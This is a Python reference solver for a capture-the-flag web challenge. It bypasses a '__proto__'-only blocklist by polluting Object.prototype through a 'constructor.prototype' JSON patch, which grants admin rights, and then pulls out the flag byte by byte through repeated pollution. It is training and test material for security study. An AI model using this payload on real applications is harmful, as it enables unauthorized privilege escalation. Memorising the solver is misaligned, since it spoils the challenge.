#!/usr/bin/env python3
"""
ZSCTF :: Amalgam -- reference solver.

Intended path (exploits only the prototype pollution that is in plain sight in
challenge/app.js), in two layers:

  CRUX -- open the admin gate by prototype pollution.
  1. Amalgam deep-merges a user's JSON preference patch into their profile. The
     merge recurses into nested objects and was "hardened" against prototype
     pollution by skipping exactly one key: "__proto__".
  2. That blocklist is incomplete. Every object also inherits a `constructor`
     whose `prototype` IS Object.prototype. The merge happily recurses
         target.constructor            (the Object function)
           -> .prototype               (Object.prototype)
     because it descends into whatever mergeable value already lives at a key
     instead of clobbering it. So the patch
         {"constructor":{"prototype":{"isAdmin":true,"clearance":"<code>"}}}
     writes isAdmin/clearance onto Object.prototype -- a global pollution.
  3. The admin console (GET /api/flag) authorizes by building a FRESH object and
     reading `isAdmin` and `clearance` off it. A fresh object has neither as an
     OWN property, so both reads resolve through the polluted prototype -> admin.

  EXTRACTION -- the console never hands the flag over whole. Once authorized it
  is a per-BYTE export stream:
  4. The first authorized GET /api/flag returns a MANIFEST only (no flag bytes):
     the keystream root key `stream_key`, the flag `length`, a verification
     `digest` = SHA-256(flag)[:16], and an inert decoy `cache_preview`.
  5. Each flag byte is read by placing an integer `exportOffset` on the
     authorization context -- which the console ALSO reads off a FRESH object.
     So the offset, like isAdmin/clearance, must live on Object.prototype:
     advancing the cursor one byte at a time REUSES the same pollution vector.
     Each request then returns exactly one masked byte:
         mask = flag[offset] XOR keystream(offset)
         keystream(offset) = SHA-256(stream_key | "|" | offset)[0]
  6. Reassemble all offsets, verify SHA-256(flag)[:16] == digest, and confirm
     the published strict format ^zerosecurectf\\{[a-z0-9_]{8,48}\\}$. The decoy
     `cache_preview` is rejected the same way a careful human would: it fails
     that strict validator on sight (UPPERCASE body) and fails the digest.

The clearance code is per-instance; we read it from /whoami and inject it, so
the winning patch is specific to this workspace (not copy-paste from elsewhere).

Usage:
    python solve.py --url http://HOST:PORT
"""
import re
import sys
import json
import hashlib
import argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError

STRICT = re.compile(r"^zerosecurectf\{[a-z0-9_]{8,48}\}$")


def _call(base, path, method="GET", obj=None, timeout=20):
    data = json.dumps(obj).encode() if obj is not None else None
    headers = {"Accept": "application/json"}
    if data is not None:
        headers["Content-Type"] = "application/json"
    req = Request(base.rstrip("/") + path, data=data, headers=headers, method=method)
    try:
        with urlopen(req, timeout=timeout) as r:
            return r.status, json.loads(r.read().decode("utf-8", "replace"))
    except HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode("utf-8", "replace"))
        except Exception:
            return e.code, {}


def keystream_byte(stream_key, i):
    # mirror app.js: SHA-256(stream_key | "|" | str(i))[0]
    h = hashlib.sha256()
    h.update(stream_key.encode())
    h.update(b"|")
    h.update(str(i).encode())
    return h.digest()[0]


def pollute(base, clearance, offset=None):
    """Prototype-pollution patch: always re-assert admin; optionally the cursor."""
    proto = {"isAdmin": True, "clearance": clearance}
    if offset is not None:
        proto["exportOffset"] = offset
    payload = {"constructor": {"prototype": proto}}
    return _call(base, "/api/preferences", method="POST", obj=payload)


def solve(base):
    # 1. Learn this instance's required clearance code (public, per-instance).
    st, who = _call(base, "/whoami")
    clearance = who.get("required_clearance")
    if not clearance:
        raise SystemExit("[-] could not read required_clearance from /whoami: %s" % who)
    print("[+] instance %s requires clearance %s" % (who.get("fingerprint"), clearance))

    # 2. CRUX: pollute Object.prototype via constructor.prototype (the __proto__
    #    key is blocklisted; this route is not) to become admin.
    pollute(base, clearance)
    st, me = _call(base, "/api/me")
    print("[+] /api/me authorized = %s" % me.get("authorized"))
    if not me.get("authorized"):
        raise SystemExit("[-] pollution did not open the gate: %s" % me)

    # 3. First authorized call -> the export MANIFEST (no flag bytes).
    st, man = _call(base, "/api/flag")
    if not (st == 200 and man.get("stream")):
        raise SystemExit("[-] expected an export manifest, got status=%s body=%s" % (st, man))
    length = man["length"]
    stream_key = man["stream_key"]
    digest = man["digest"]
    decoy = man.get("cache_preview")
    print("[+] export manifest: length=%d digest=%s key=%s..." % (length, digest, stream_key[:8]))

    # Reject the decoy preview by the SAME reasoning a careful human uses: the
    # published strict validator. (It is UPPERCASE -> fails on sight.)
    if decoy is not None and STRICT.match(decoy):
        raise SystemExit("[-] unexpected: cache_preview passed the strict validator: %r" % decoy)
    print("[+] decoy cache_preview=%r rejected (fails ^zerosecurectf{[a-z0-9_]{8,48}}$)" % decoy)

    # 4. Stream every byte. Each offset requires its OWN pollution, because the
    #    console reads exportOffset off a fresh object (inherited, not own).
    out = bytearray(length)
    for i in range(length):
        pollute(base, clearance, offset=i)
        st, piece = _call(base, "/api/flag")
        if not (st == 200 and piece.get("offset") == i and "mask" in piece):
            raise SystemExit("[-] bad byte response at offset %d: %s" % (i, piece))
        masked = int(piece["mask"], 16)
        out[i] = masked ^ keystream_byte(stream_key, i)
    flag = out.decode("utf-8", "replace")

    # 5. Verify the reconstruction against the published digest AND the strict
    #    format. This closes guess-exposure: a wrong reassembly fails here.
    got = hashlib.sha256(flag.encode()).hexdigest()[:16]
    if got != digest:
        raise SystemExit("[-] reconstruction failed digest check: got %s want %s" % (got, digest))
    if not STRICT.match(flag):
        raise SystemExit("[-] reconstruction is not a valid flag: %r" % flag)
    print("[+] reconstruction verified (digest match + strict format)")
    return flag


def main():
    ap = argparse.ArgumentParser(description="Amalgam reference solver (prototype pollution + per-byte export stream).")
    ap.add_argument("--url", required=True, metavar="http://HOST:PORT",
                    help="base URL of the running Amalgam app")
    args = ap.parse_args()
    try:
        flag = solve(args.url)
    except (URLError, OSError) as e:
        print("[-] network error talking to %s: %s" % (args.url, e))
        return 1
    print("[+] FLAG =", flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
